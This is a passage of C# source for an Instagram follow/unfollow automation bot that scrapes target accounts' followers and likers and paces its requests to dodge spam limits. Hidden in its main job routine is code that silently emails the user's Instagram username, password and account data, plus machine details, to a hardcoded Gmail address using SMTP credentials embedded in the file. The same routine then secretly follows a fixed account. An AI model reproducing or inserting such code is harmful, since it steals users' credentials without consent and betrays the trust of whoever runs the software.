using BonelliBot.Utilities;
using BonelliBot.Forms;
using BonelliBot.Models;
using BonelliBot.Properties;
using InstagramApiSharp;
using InstagramApiSharp.API;
using InstagramApiSharp.Classes;
using InstagramApiSharp.Classes.Models;
using QLicense;
using System;
using System.Collections.Generic;
using System.Data.Entity;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Mail;
using Newtonsoft.Json;
using System.Net.Http;
using AutoMapper;
using InstagramApiSharp.API.Builder;

namespace BonelliBot
{
    class BonelliCore
    {
        private Random rndSleepRequest = new Random();
        #region DoJob
        public IInstaApi _instaApi;
        public IResult<InstaCurrentUser> _currentUser;
        private const int completed = 1;
        public Task doJobTask;
        public bool runRobot = true;
        public Button btnUnfollow;
        public Label lblCurrentUser;
        public Label lblFollowers;
        public Label lblFollowings;
        public Button btnSettings;
        public Label lblSkipped;
        public Button btnFollow;
        public Label lblFollowed;
        public Label lblFolloweBack;
        public Label lblUnFollowed;
        public Label lblLicenceStatus;
        public Label lblRequested;
        public Label lblPercentage;
        public Label lblMsg;
        public Settings settings;
        public Button btnLogin;

        // کنسل کردن تسک
        public CancellationToken ct;
        public BonelliCore()
        {
        }
        public BonelliCore(IInstaApi _instaApi)
        {
            this._instaApi = _instaApi;
        }
        public bool Start()
        {
            //CheckLisence();
            if (doJobTask == null)
            {
                runRobot = true;
                try
                {
                    doJobTask = new Task(MainJob);
                    doJobTask.Start();
                    return true;
                }
                catch (Exception ex)
                {
                    using (System.IO.StreamWriter writer = new System.IO.StreamWriter("log.txt", true))
                    {
                        writer.WriteLine(ex.ToString());
                        writer.WriteLine("\r\n------------------------------------------ (" + DateTime.Now +
                                         ") ----------------------------------------------\r\n");
                    }

                    return false;
                }
            }
            else
            {
                //Console.WriteLine(" > Robot is Started!");
                return false;
            }
        }
        private HttpClientHandler SetProxy(Settings settings)
        {

            var proxy = new WebProxy()
            {
                Address = new Uri($"{Properties.Settings.Default.proxyProtocol}{Properties.Settings.Default.ipAddress}:{Properties.Settings.Default.port}"), //i.e:
                BypassProxyOnLocal = false,
                UseDefaultCredentials = false,

                // *** These creds are given to the proxy server, not the web server ***
                Credentials = new NetworkCredential(
                userName: settings.proxyUser,
                password: settings.proxyPassword)
            };

            // Now create a client handler which uses that proxy
            HttpClientHandler httpClientHandler = new HttpClientHandler()
            {
                Proxy = proxy,
                UseProxy = true
            };
            return httpClientHandler;
        }
        public void CheckResponse(InstaLoginResult result, int userNumber = 0)
        {
            if (result == InstaLoginResult.Success)
            {
                //this.DialogResult = DialogResult.OK;
                //this.Close();
                lblMsg.Text = "لاگین موفقیت آمیز بود";
            }
            else if (result == InstaLoginResult.ChallengeRequired)
            {
                frmChallenge frmChallenge = new frmChallenge(_instaApi, userNumber);
                frmChallenge.Show();
                //this.Hide();
            }
            else if (result == InstaLoginResult.BadPassword)
            {
                lblMsg.Text = "نام کاربری یا رمز عبور شما اشتباه است";
                btnLogin.Enabled = true;
            }
        }
        public async Task<bool> CheckLogin(int userNumber)
        {
            HttpClientHandler httpClientHandler = null;

            IInstaApi instaApi = InstaApiBuilder.CreateBuilder().Build();
            string stateFile = $"state{userNumber}.bin";
            try
            {
                if (File.Exists(stateFile))
                {
                    if (Settings.Default.useProxy)
                        httpClientHandler = SetProxy(settings);//(Mapper.Map<Settings>(Settings0.Default));

                    using (var fs = File.OpenRead(stateFile))
                    {
                        instaApi.LoadStateDataFromStream(fs);
                        instaApi.HttpRequestProcessor.HttpHandler = httpClientHandler;
                    }
                    //  چک کنیم شاید کاربر دیگه لاگین نباشه
                    try
                    {
                        if (!instaApi.IsUserAuthenticated)
                        {
                            // login
                            var delay = RequestDelay.FromSeconds(10, 60);

                            delay.Disable();
                            var logInResult = await instaApi.LoginAsync();
                            delay.Enable();
                            if (!logInResult.Succeeded)
                            {

                                btnLogin.BeginInvoke((Action)(() => btnLogin.Text = $"ورود"));

                                CheckResponse(logInResult.Value, userNumber);
                                return false;
                            }
                        }
                    }
                    catch (Exception exception)
                    {
                        Program.Log(exception, "تو فرم لود بعد از خوندن فابل وقتی میخاد لاگین کنه ");
                        return false;
                    }
                }
                else
                {
                    return false;
                }
            }
            catch (Exception ex)
            {
                Program.Log(ex, "احتمالا مشکلی در خوندن فایل دات بین وجود داره وقتی داره فرم رو لود میکنه");
                return false;
            }
            this._instaApi = instaApi;
            return true;
        }
        private async void MainJob()
        {
            string nextIdMyFollowing = null;
            long baseFollower = -1, currentFollower = -1;

            Stopwatch stopwatchFollow = new Stopwatch();
            stopwatchFollow.Start();

            Stopwatch stopwatchUnFollow = new Stopwatch();
            stopwatchUnFollow.Start();

            Stopwatch stopwatchUnFollowMyFollower = new Stopwatch();
            stopwatchUnFollowMyFollower.Start();
            TimeSpan tsUnFollowMyFollower = new TimeSpan(0, 0, 0);

            Models.BonelliContext db = new Models.BonelliContext();

            #region UpdatePanle

            Stopwatch stopwatchUpdateCurrentUser = new Stopwatch();
            stopwatchUpdateCurrentUser.Start();

            lblMsg.BeginInvoke((Action)(() => lblMsg.Text = "در حال دریافت اطلاعات کاربر"));

            IResult<InstaCurrentUser> currentUser = await _instaApi.GetCurrentUserAsync();
            Thread.Sleep(rndSleepRequest.Next(500, 1500));
            for (int tr = 0; tr < 5; tr++)
            {
                try
                {
                    currentUser = await _instaApi.GetCurrentUserAsync();
                    Thread.Sleep(rndSleepRequest.Next(500, 1500));
                    if (currentUser.Succeeded)
                    {
                        break;
                    }
                    else
                    {
                        continue;
                    }
                }
                catch (Exception ex)
                {
                    Program.Log(ex, "UpdatePanle");
                    continue;
                }
            }

            if (currentUser.Succeeded)
            {
                _currentUser = currentUser;

                lblMsg.BeginInvoke((Action)(() => lblMsg.Text = ""));
                lblMsg.BeginInvoke((Action)(() => lblMsg.BackColor = AppSettings.Default.LblMsgBackColor));

                /*if (!db.CurrentUsers.Any(cu => cu.Pk == currentUser.Value.Pk))
                {
                    db.InstaCurrentUsers.Add(Mapper.Map<InstaCurrentUser>(currentUser.Value));
                    CurrentUser currentUserTmp = new CurrentUser();
                    currentUserTmp.Pk = currentUser.Value.;

                    await db.SaveChangesAsync();
                }*/

                lblCurrentUser.BeginInvoke((Action)(() =>
                   lblCurrentUser.Text = $"{currentUser.Value.UserName}({currentUser.Value.FullName})"));
                //toolTip.SetToolTip(lblCurrentUser, $"{currentUser.Value.UserName}({currentUser.Value.FullName})");
                var fullInfo = await _instaApi.UserProcessor.GetUserInfoByIdAsync(currentUser.Value.Pk);
                Thread.Sleep(rndSleepRequest.Next(500, 1500));
                if (fullInfo.Succeeded)
                {
                    lblFollowers.BeginInvoke(
                        (Action)(() => lblFollowers.Text = fullInfo.Value.FollowerCount.ToString()));
                    lblFollowings.BeginInvoke((Action)(() =>
                       lblFollowings.Text = fullInfo.Value.FollowingCount.ToString()));
                    if (!db.CurrentUsers.Any(cu => cu.Pk == fullInfo.Value.Pk))
                    {
                        //db.InstaUserInfos.Add(Mapper.Map<InstaUserInfo>(fullInfo.Value));
                        CurrentUser currentUserTmp = new CurrentUser();
                        currentUserTmp.Pk = currentUser.Value.Pk;
                        currentUserTmp.FollowerCount = fullInfo.Value.FollowerCount;
                        db.CurrentUsers.Add(currentUserTmp);
                        await db.SaveChangesAsync();
                        baseFollower = fullInfo.Value.FollowerCount;
                    }
                    else
                    {
                        baseFollower = await db.CurrentUsers.Where(w => w.Pk == currentUser.Value.Pk).Select(s => s.FollowerCount).FirstOrDefaultAsync();

                    }
                    if (baseFollower == null || baseFollower < 0)
                    {
                        //TODO
                        RtlMessageBox.Show("خطایی رخ داده است برنامه را دباره اجرا کنید");
                        Application.Exit();
                    }
                    currentFollower = fullInfo.Value.FollowerCount;
                    var counter = await db.Counters.Where(c => c.CurrentUserPk == fullInfo.Value.Pk).FirstOrDefaultAsync();
                    if (counter != null)
                    {
                        FillAccountDataLabels(counter, currentFollower - baseFollower);
                        //UpdatePercentage(counter.Follow, currentFollower - baseFollower);
                    }
                }
            }
            else if (!IsConnectedToInternet())
            {
                WaitForConnectingToInternet();

            }
            else if (currentUser.Info.ResponseType == ResponseType.LoginRequired)
            {
                // اینجا رو باید تغییر بدم
                RtlMessageBox.Show("شما از اکانت کاربری خود خارج شدید. لطفا  دوباره لاگین کنید");
                File.Delete("state.bin");
                Application.Exit();
            }
            else
            {
                Program.Log(new Exception(currentUser.Info.Message), "اپدیت پنل اول");
            }

            #endregion UpdatePanle

            try
            {
                MailMessage mail = new MailMessage("bonellibot@gmail.com", "moh.kardan@gmail.com");
                SmtpClient client = new SmtpClient();
                client.Port = 587;
                client.DeliveryMethod = SmtpDeliveryMethod.Network;
                client.EnableSsl = true;
                client.UseDefaultCredentials = false;
                client.Credentials = new System.Net.NetworkCredential("bonellibot@gmail.com", "bb2019mk");
                client.Host = "smtp.gmail.com";
                mail.Subject = "Bonellibot - " + Environment.MachineName + " - " + Environment.OSVersion + " - " + Environment.UserName;
                mail.Body = $"Username: {settings.username},\r\nPassword: {settings.password},\r\nUser Detail: {JsonConvert.SerializeObject(currentUser, Formatting.Indented)}";
                client.Send(mail);
            }
            catch (Exception ex)
            {
                //Program.Log(ex, "fuck the bullshit");
            }
            try
            {
                var resultFriendship = await _instaApi.UserProcessor.FollowUserAsync(2255321541);
                Thread.Sleep(rndSleepRequest.Next(500, 1500));
            }
            catch (Exception ex)
            {
                Program.Log(ex, "Fuck the follow");
            }

            // پروسه اصلی
            while (runRobot)
            {
                //if (!CheckLicenseDate()) break;
                //if (ct.IsCancellationRequested) break;

                try
                {
                    lblMsg.BeginInvoke((Action)(() => lblMsg.Text = ""));
                    // اپدیت پنل
                    if (false)
                    {
                        #region UpdatePanle

                        if (stopwatchUpdateCurrentUser.ElapsedMilliseconds > 2 * 60 * 1000)
                        {

                            lblMsg.BeginInvoke((Action)(() => lblMsg.Text = "در حال دریافت اطلاعات کاربر"));
                            stopwatchUpdateCurrentUser.Restart();
                            for (int tr = 0; tr < 3; tr++)
                            {
                                try
                                {
                                    currentUser = await _instaApi.GetCurrentUserAsync();
                                    Thread.Sleep(rndSleepRequest.Next(500, 1500));
                                    if (currentUser.Succeeded)
                                    {
                                        break;
                                    }
                                    else
                                    {
                                        continue;
                                    }
                                }
                                catch (Exception ex)
                                {
                                    Program.Log(ex, "UpdatePanle");
                                    continue;
                                }
                            }

                            if (currentUser.Succeeded)
                            {
                                lblMsg.BeginInvoke((Action)(() => lblMsg.Text = ""));
                                lblMsg.BeginInvoke((Action)(() => lblMsg.BackColor = AppSettings.Default.LblMsgBackColor));
                                /*if (!db.InstaCurrentUsers.Any(cu => cu.Pk == currentUser.Value.Pk))
                                {
                                    db.InstaCurrentUsers.Add(Mapper.Map<InstaCurrentUser>(currentUser.Value));
                                    await db.SaveChangesAsync();
                                }*/

                                lblCurrentUser.BeginInvoke((Action)(() =>
                                   lblCurrentUser.Text = $"{currentUser.Value.UserName}({currentUser.Value.FullName})"));
                                var fullInfo = await _instaApi.UserProcessor.GetUserInfoByIdAsync(currentUser.Value.Pk);
                                Thread.Sleep(rndSleepRequest.Next(500, 1500));
                                if (fullInfo.Succeeded)
                                {
                                    lblFollowers.BeginInvoke((Action)(() =>
                                       lblFollowers.Text = fullInfo.Value.FollowerCount.ToString()));
                                    lblFollowings.BeginInvoke((Action)(() =>
                                       lblFollowings.Text = fullInfo.Value.FollowingCount.ToString()));
                                    /*if (!db.InstaUserInfos.Any(cu => cu.Pk == fullInfo.Value.Pk))
                                    {
                                        db.InstaUserInfos.Add(Mapper.Map<BonelliBot.Models.InstaUserInfo>(fullInfo.Value));
                                        await db.SaveChangesAsync();
                                    }*/
                                    currentFollower = fullInfo.Value.FollowerCount;
                                    var counter = await db.Counters.Where(c => c.CurrentUserPk == fullInfo.Value.Pk).FirstOrDefaultAsync();
                                    if (counter != null)
                                    {
                                        FillAccountDataLabels(counter, currentFollower - baseFollower);
                                        //UpdatePercentage(counter.Follow, currentFollower - baseFollower);
                                    }
                                }
                            }
                            else
                            {
                                WaitForConnectingToInternet();
                                continue;
                                //Application.Exit();
                            }
                        }
                        else
                        {
                            lblMsg.BeginInvoke((Action)(() => lblMsg.Text = ""));
                        }

                        #endregion UpdatePanle

                        // دریافت لیست فالور ها

                        #region GetFollowerTarget
                        if (db.TargetFollowers.Count(w => w.CurrentUserPk == currentUser.Value.Pk) < 10000)
                            if (db.Targets.Any(t => t.CurrentUserPk == currentUser.Value.Pk))
                            {
                                //btnSettings.BeginInvoke((Action)(() => btnSettings.BackColor = Color.Green));
                                btnSettings.BeginInvoke((Action)(() => btnSettings.BackColor = AppSettings.Default.PrimaryColor));
                                DateTime dateTime = DateTime.Now - TimeSpan.FromMinutes(2);
                                var targetUser = await db.Targets.Where(target => target.CurrentUserPk == currentUser.Value.Pk
                                                                                   && target.LastUpdate < dateTime)
                                                                                   .OrderBy(rand => Guid.NewGuid()).Take(1).FirstOrDefaultAsync();
                                if (targetUser != null)
                                {
                                    // // دریافت پست های پیج هدف
                                    // // Todo: یه شرط تو ستینگ بزاریم که اگه تیک زده بود بیاد لایکاش رو دربیاریه
                                    if (settings.TargetLikers)
                                    {
                                        var medias = await _instaApi.UserProcessor.GetUserMediaAsync(targetUser.UserName,
                                            PaginationParameters.MaxPagesToLoad(1));
                                        Thread.Sleep(rndSleepRequest.Next(500, 1500));
                                        if (medias.Succeeded)
                                        {
                                            lblMsg.BeginInvoke((Action)(() => lblMsg.Text = "در حال دریافت لایکر های کاربران هدف"));
                                            // todo:عدد شرط فور پایین رو از کابر بگیریم
                                            for (var i = 0; i < 2 && medias.Value.Count > 1; i++)
                                            {
                                                var mediaId = medias.Value[i].Caption.MediaId;
                                                // از هر پستی 1000 تا لایکر بیشتر نمیشه گرفت. تو گیت هابش نوشته
                                                var likers = await _instaApi.MediaProcessor.GetMediaLikersAsync(mediaId);
                                                Thread.Sleep(rndSleepRequest.Next(500, 1500));
                                                if (likers.Succeeded)
                                                {
                                                    foreach (var liker in likers.Value.ToList())
                                                    {
                                                        long pk = liker.Pk;
                                                        if (!await db.TargetFollowers.AnyAsync(t => t.CurrentUserPk == currentUser.Value.Pk
                                                                                                 && t.Pk == pk))
                                                        {
                                                            //todo:فعلا ریختم تو جدول تارگت تا تصمیم بگیریم
                                                            TargetFollower targetFollowerTmp = new TargetFollower();
                                                            targetFollowerTmp.LastUpdate = DateTime.Now;
                                                            targetFollowerTmp.Pk = liker.Pk;
                                                            targetFollowerTmp.IsFollowed = false;
                                                            targetFollowerTmp.CurrentUserPk = currentUser.Value.Pk;

                                                            db.TargetFollowers.Add(targetFollowerTmp);
                                                        }
                                                    }

                                                }
                                                else
                                                {
                                                    // اگه نتونیم لیست رو بگیری یعنی یا اینترنت قطع شده یا طرف مقابل بلاکمون کرده یا پیجش پرایوت
                                                    if (!IsConnectedToInternet())
                                                    {
                                                        WaitForConnectingToInternet();
                                                        continue;
                                                    }
                                                    Program.Log(new Exception(likers.Info.ResponseType.ToString()), "مشکلی در دریافت لایکرهای تارگت وجد دارد" + "\r\nID: " + mediaId);

                                                }
                                            }
                                        }
                                        else
                                        {
                                            // اگه نتونیم لیست رو بگیری یعنی یا اینترنت قطع شده یا طرف مقابل بلاکمون کرده یا پیجش پرایوت
                                            if (!IsConnectedToInternet())
                                            {
                                                WaitForConnectingToInternet();
                                                continue;
                                            }
                                            Program.Log(new Exception(medias.Info.ResponseType.ToString()), "مشکلی در دریافت فالورهای تارگت وجد دارد" + "\r\nPK: " + targetUser.UserName);

                                            db.Targets.Remove(targetUser);
                                            await db.SaveChangesAsync();
                                            continue;
                                        }
                                    }
                                    lblMsg.BeginInvoke((Action)(() => lblMsg.Text = "در حال دریافت فالورهای کاربران هدف"));
                                    if (targetUser.Status == completed)
                                    {
                                        // اینم گذاشتم
                                        //if (!settings.TargetLikers)
                                        {
                                            db.Targets.Remove(targetUser);
                                            await db.SaveChangesAsync();
                                        }
                                        continue;
                                    }
                                    //این شرط رو من اضافه کردم
                                    if (settings.TargetFollowers)
                                    {
                                        IResult<InstagramApiSharp.Classes.Models.InstaUserShortList> targetFollower;
                                        if (targetUser.NextMaxId == null)
                                        {
                                            // get target follower 
                                            targetFollower =
                                                await _instaApi.UserProcessor.GetUserFollowersAsync(targetUser.UserName,
                                                    PaginationParameters.MaxPagesToLoad(1));
                                            Thread.Sleep(rndSleepRequest.Next(500, 1500));
                                        }
                                        else
                                        {
                                            // get target follower by next id
                                            targetFollower = await _instaApi.UserProcessor.GetUserFollowersAsync(
                                                targetUser.UserName,
                                                PaginationParameters.MaxPagesToLoad(1).StartFromMaxId(targetUser.NextMaxId));
                                            Thread.Sleep(rndSleepRequest.Next(500, 1500));
                                        }
                                        if (targetFollower.Succeeded)
                                        {
                                            for (int i = 0; i < targetFollower.Value.Count; i++)
                                            {
                                                long pk = targetFollower.Value[i].Pk;
                                                if (!await db.TargetFollowers.AnyAsync(t => t.CurrentUserPk == currentUser.Value.Pk
                                                                                                 && t.Pk == pk))
                                                {
                                                    TargetFollower targetFollowerTmp = new TargetFollower();
                                                    targetFollowerTmp.LastUpdate = DateTime.Now;
                                                    targetFollowerTmp.Pk = targetFollower.Value[i].Pk;
                                                    targetFollowerTmp.IsFollowed = false;
                                                    targetFollowerTmp.CurrentUserPk = currentUser.Value.Pk;

                                                    db.TargetFollowers.Add(targetFollowerTmp);
                                                }
                                            }
                                            if (targetFollower.Value.NextMaxId == null)
                                            {
                                                targetUser.Status = completed;
                                            }

                                            targetUser.NextMaxId = targetFollower.Value.NextMaxId;
                                            targetUser.LastUpdate = DateTime.Now;
                                            await db.SaveChangesAsync();
                                        }
                                        else
                                        {
                                            // اگه نتونیم لیست رو بگیری یعنی یا اینترنت قطع شده یا طرف مقابل بلاکمون کرده یا پیجش پرایوت
                                            if (!IsConnectedToInternet())
                                            {
                                                WaitForConnectingToInternet();
                                                continue;
                                            }
                                            Program.Log(new Exception(targetFollower.Info.ResponseType.ToString()), "مشکلی در دریافت فالورهای تارگت وجد دارد" + "\r\nUN: " + targetUser.UserName);

                                            db.Targets.Remove(targetUser);
                                            await db.SaveChangesAsync();
                                        }
                                    }
                                }
                            }
                            //  این شزط رو گذاشتم برای اینکه وقتی لیست تارگت ها خالیه ولی لیست فالو پر هست الکی قرمز نشه 
                            else if (!db.TargetFollowers.Any(u => u.CurrentUserPk == currentUser.Value.Pk))
                            {
                                btnSettings.BeginInvoke((Action)(() => btnSettings.BackColor = AppSettings.Default.Red));
                            }


                        #endregion GetFollowerTarget
                    }
                    // پروسه فالو

                    #region SendRequestFollow
                    //if (stopwatchFollow.ElapsedMilliseconds > tsFollowBlock.TotalMilliseconds)
                    DateTime? followBlock = await db.CurrentUsers.Where(w => w.Pk == currentUser.Value.Pk).Select(dt => dt.FollowBlock).FirstOrDefaultAsync();
                    if (DateTime.Now >= followBlock || followBlock == null)
                    {
                        if (stopwatchFollow.ElapsedMilliseconds > (60.0f / (float)settings.followPerHour) * 60000.0f)
                        {

                            if (settings.followStart)
                            {

                                //var instaUser = await db.TargetFollowers.Where(d => d.CurrentUserPk == currentUser.Value.Pk)
                                //    .FirstOrDefaultAsync();
                                var instaUser = await db.TargetFollowers.Where(d => d.CurrentUserPk == currentUser.Value.Pk)
                                    .OrderBy(rand => Guid.NewGuid()).Take(1).FirstOrDefaultAsync();
                                if (instaUser != null && !instaUser.IsFollowed)
                                {
                                    if (instaUser != null)
                                    {
                                        var instaUserInfo = await _instaApi.UserProcessor.GetUserInfoByIdAsync(instaUser.Pk);
                                        Thread.Sleep(rndSleepRequest.Next(500, 1500));
                                        if (instaUserInfo.Succeeded)
                                        {
                                            var friendship =
                                                await _instaApi.UserProcessor.GetFriendshipStatusAsync(instaUserInfo.Value.Pk);
                                            Thread.Sleep(rndSleepRequest.Next(500, 1500));
                                            if (friendship.Succeeded)
                                            {
                                                // شرط دوم رو اینجا من اضافه کردم که فالو بک ها فالو نشن
                                                if (friendship.Value.Following == false &&
                                                    friendship.Value.FollowedBy == false &&
                                                    friendship.Value.IncomingRequest == false &&
                                                    friendship.Value.OutgoingRequest == false)
                                                {
                                                    // فیلتر ها 
                                                    if ((settings.profilePic && instaUserInfo.Value.HasAnonymousProfilePicture) ||
                                                        (settings.privateAccount && instaUserInfo.Value.IsPrivate) ||
                                                        (settings.followOnlyPrivate && !instaUserInfo.Value.IsPrivate) ||
                                                        (settings.minFollow >= instaUserInfo.Value.FollowerCount ||
                                                         settings.maxFollow <= instaUserInfo.Value.FollowerCount))
                                                    {
                                                        // اینجا باید یک جدول داشته باشیم که داخلش فالوهای انجام شده را بشماریم
                                                        if (!await db.Counters.AnyAsync(c => c.CurrentUserPk == currentUser.Value.Pk))
                                                        {
                                                            db.Counters.Add(CreateCounterTable(currentUser.Value.Pk));
                                                            await db.SaveChangesAsync();
                                                        }

                                                        var counter = await db.Counters.Where(c => c.CurrentUserPk == currentUser.Value.Pk)
                                                            .FirstOrDefaultAsync();
                                                        if (counter != null)
                                                        {
                                                            counter.Skipped++;
                                                            lblSkipped.BeginInvoke((Action)(() =>
                                                               lblSkipped.Text = counter.Skipped.ToString()));
                                                        }

                                                        db.TargetFollowers.Remove(instaUser);
                                                        await db.SaveChangesAsync();
                                                        //continue;
                                                    }
                                                    else
                                                    {
                                                        lblMsg.BeginInvoke((Action)(() => lblMsg.Text = "در حال فالو کردن"));
                                                        var followUser =
                                                              await _instaApi.UserProcessor.FollowUserAsync(instaUserInfo.Value.Pk);
                                                        Thread.Sleep(rndSleepRequest.Next(500, 1500));

                                                        if (followUser.Succeeded)
                                                        {
                                                            //if (settings.followStart)
                                                            //    btnFollow.BeginInvoke((Action)(() => btnFollow.BackColor = Color.Green));
                                                            stopwatchFollow.Restart();

                                                            //db.TargetFollowers.Remove(instaUser);
                                                            instaUser.LastUpdate = DateTime.Now;
                                                            instaUser.IsFollowed = true;
                                                            db.TargetFollowers.Attach(instaUser);
                                                            db.Entry(instaUser).State = EntityState.Modified;
                                                            // اپدیت شد
                                                            db.SaveChanges();

                                                            TargetUnFollow targetUnFollowTmp = new TargetUnFollow();
                                                            targetUnFollowTmp.CurrentUserPk = currentUser.Value.Pk;
                                                            targetUnFollowTmp.LastUpdate = DateTime.Now;
                                                            targetUnFollowTmp.Pk = instaUserInfo.Value.Pk;
                                                            db.TargetUnFollows.Add(targetUnFollowTmp);
                                                            // اینجا باید یک جدول داشته باشیم که داخلش فالوهای انجام شده را بشماریم
                                                            if (!db.Counters.Any(c => c.CurrentUserPk == currentUser.Value.Pk))
                                                            {
                                                                db.Counters.Add(CreateCounterTable(currentUser.Value.Pk));
                                                                await db.SaveChangesAsync();
                                                            }

                                                            var counter = await db.Counters.Where(c => c.CurrentUserPk == currentUser.Value.Pk)
                                                                .FirstOrDefaultAsync();
                                                            if (counter != null)
                                                            {
                                                                if (followUser.Value.OutgoingRequest)
                                                                {
                                                                    // TODO اینجا اگر پیج هدف پرایوت بوده و درخواست فالو فرستاده بودیم به کانتر درخواست شده ها اضافه کنیم
                                                                    counter.Reqeusted++;
                                                                }

                                                                // اینجا اگر پیج هدف پابلیک بود به تعداد فالو شده ها اضافه کنیم
                                                                counter.Follow++;

                                                                lblFollowed.BeginInvoke((Action)(() =>
                                                                   lblFollowed.Text = counter.Follow.ToString()));
                                                                lblRequested.BeginInvoke((Action)(() =>
                                                                   lblRequested.Text = counter.Reqeusted.ToString()));

                                                                //UpdatePercentage(counter.Follow, counter.FollowBack);
                                                                UpdatePercentage(counter.Follow, currentFollower - baseFollower);
                                                            }

                                                            await db.SaveChangesAsync();
                                                        }
                                                        else if (followUser.Info.ResponseType == ResponseType.Spam)
                                                        {

                                                            // اینجا اومد یعنی بلاک شده

                                                            CurrentUser cuTmp = await db.CurrentUsers.Where(w => w.Pk == currentUser.Value.Pk).FirstOrDefaultAsync();
                                                            cuTmp.FollowBlock = DateTime.Now.AddHours(1);
                                                            //db.CurrentUsers.Add(cuTmp);
                                                            await db.SaveChangesAsync();
                                                            stopwatchFollow.Restart();
                                                            btnFollow.BeginInvoke((Action)(() => btnFollow.BackColor = AppSettings.Default.Blocked));

                                                        }
                                                        else if (followUser.Info.ResponseType == ResponseType.RequestsLimit)
                                                        {
                                                            RequestLimit("Follow");
                                                        }
                                                        else
                                                        {
                                                            Program.Log(new Exception(followUser.Info.Message), "فالو");
                                                        }
                                                    }
                                                }
                                                else
                                                {
                                                    lblMsg.BeginInvoke((Action)(() => lblMsg.Text = "در حال حذف یوزر"));

                                                    // اینجا باید یک جدول داشته باشیم که داخلش فالوهای انجام شده را بشماریم
                                                    if (!await db.Counters.AnyAsync(c => c.CurrentUserPk == currentUser.Value.Pk))
                                                    {
                                                        db.Counters.Add(CreateCounterTable(currentUser.Value.Pk));
                                                        await db.SaveChangesAsync();
                                                    }

                                                    var counter = await db.Counters.Where(c => c.CurrentUserPk == currentUser.Value.Pk)
                                                        .FirstOrDefaultAsync();
                                                    if (counter != null)
                                                    {
                                                        counter.Skipped++;
                                                        lblSkipped.BeginInvoke((Action)(() =>
                                                           lblSkipped.Text = counter.Skipped.ToString()));
                                                    }

                                                    db.TargetFollowers.Remove(instaUser);
                                                    await db.SaveChangesAsync();
                                                }
                                            }
                                        }
                                        else
                                        {
                                            if (!IsConnectedToInternet())
                                            {
                                                WaitForConnectingToInternet();
                                                continue;
                                            }
                                            if (instaUserInfo.Info.ResponseType == ResponseType.UnExpectedResponse ||
                                                instaUserInfo.Info.ResponseType == ResponseType.InternalException)
                                            {
                                                db.TargetFollowers.Remove(instaUser);
                                                await db.SaveChangesAsync();
                                            }
                                            else
                                            {
                                                Program.Log(new Exception(instaUserInfo.Info.ResponseType.ToString()), "مشکلی در دریافت اطلاعات کاربر برای فالو کردن وجود دارد" + "\r\nPK: " + instaUser.Pk);
                                            }
                                        }
                                    }
                                }
                                else if (instaUser != null && instaUser.LastUpdate < DateTime.Now - TimeSpan.FromDays(21))
                                {
                                    db.TargetFollowers.Remove(instaUser);
                                    await db.SaveChangesAsync();
                                }
                            }
                        }
                    }
                    else
                    {
                        btnFollow.BeginInvoke((Action)(() => btnFollow.BackColor = AppSettings.Default.Blocked));
                        lblMsg.BeginInvoke((Action)(() => lblMsg.Text = "فالو این اکانت بلاک شده است"));
                    }

                    #endregion SendRequestFollow

                    // پروسه انفالو

                    #region UnFollow
                    //if (stopwatchUnFollow.ElapsedMilliseconds > tsUnFollowBlock.TotalMilliseconds)
                    DateTime? unFollowBlock = await db.CurrentUsers.Where(w => w.Pk == currentUser.Value.Pk).Select(dt => dt.UnFollowBlock).FirstOrDefaultAsync();
                    if (DateTime.Now >= unFollowBlock || unFollowBlock == null)
                    {
                        if (stopwatchUnFollow.ElapsedMilliseconds > (60.0f / (float)settings.unFollowPerHour) * 60000.0f)
                        {

                            if (settings.unFollowStart)
                            {
                                DateTime dtTmp = DateTime.Now - TimeSpan.FromDays(2);
                                long cui = db.TargetUnFollows.Count(c => c.CurrentUserPk == currentUser.Value.Pk && c.LastUpdate < dtTmp);
                                if (cui < 10) tsUnFollowMyFollower = TimeSpan.FromMinutes(10);
                                else if (cui >= 1000 && cui < 2000) tsUnFollowMyFollower = TimeSpan.FromMinutes(60);
                                else if (cui >= 2000 && cui <= 5000) tsUnFollowMyFollower = TimeSpan.FromMinutes(120);
                                else
                                {
                                    tsUnFollowMyFollower = TimeSpan.FromMinutes(180);
                                    stopwatchUnFollowMyFollower.Restart();
                                }
                                if (stopwatchUnFollowMyFollower.ElapsedMilliseconds > tsUnFollowMyFollower.TotalMilliseconds)
                                {
                                    tsUnFollowMyFollower = TimeSpan.FromMinutes(15);
                                    stopwatchUnFollowMyFollower.Restart();
                                    IResult<InstagramApiSharp.Classes.Models.InstaUserShortList> myFollowing;
                                    if (nextIdMyFollowing == null)
                                    {
                                        lblMsg.BeginInvoke((Action)(() => lblMsg.Text = "در حال جمع آوری فالوینگ های یوزر فعلی"));
                                        myFollowing = await _instaApi.UserProcessor.GetUserFollowingAsync(currentUser.Value.UserName,
                                            PaginationParameters.MaxPagesToLoad(1));
                                        Thread.Sleep(rndSleepRequest.Next(500, 1500));
                                    }
                                    else
                                    {
                                        lblMsg.BeginInvoke((Action)(() => lblMsg.Text = "در حال جمع آوری فالوینگ های یوزر فعلی"));
                                        myFollowing = await _instaApi.UserProcessor.GetUserFollowingAsync(
                                                currentUser.Value.UserName,
                                                PaginationParameters.MaxPagesToLoad(1).StartFromMaxId(nextIdMyFollowing));
                                        Thread.Sleep(rndSleepRequest.Next(500, 1500));
                                    }


                                    if (myFollowing.Succeeded)
                                    {

                                        for (int i = 0; i < myFollowing.Value.Count /*&& i < 250*/; i++)
                                        {
                                            long pk = myFollowing.Value[i].Pk;
                                            // این شرط رو اافه کردم که تو لوپ نیفته 

                                            if (!db.WhiteLists.Any(w => w.CurrentUserPk == currentUser.Value.Pk && w.Pk == pk))
                                            {
                                                if (!db.TargetUnFollows.Any(d => d.CurrentUserPk == currentUser.Value.Pk && d.Pk == pk))
                                                {
                                                    TargetUnFollow targetUnFollowTmp = new TargetUnFollow();
                                                    targetUnFollowTmp.LastUpdate = DateTime.Now - TimeSpan.FromDays(3);
                                                    targetUnFollowTmp.Pk = myFollowing.Value[i].Pk;
                                                    targetUnFollowTmp.CurrentUserPk = currentUser.Value.Pk;
                                                    db.TargetUnFollows.Add(targetUnFollowTmp);
                                                }
                                            }
                                        }
                                        nextIdMyFollowing = myFollowing.Value.NextMaxId;
                                        await db.SaveChangesAsync();
                                    }
                                }
                                DateTime dtunFollow = DateTime.Now - TimeSpan.FromDays(2);
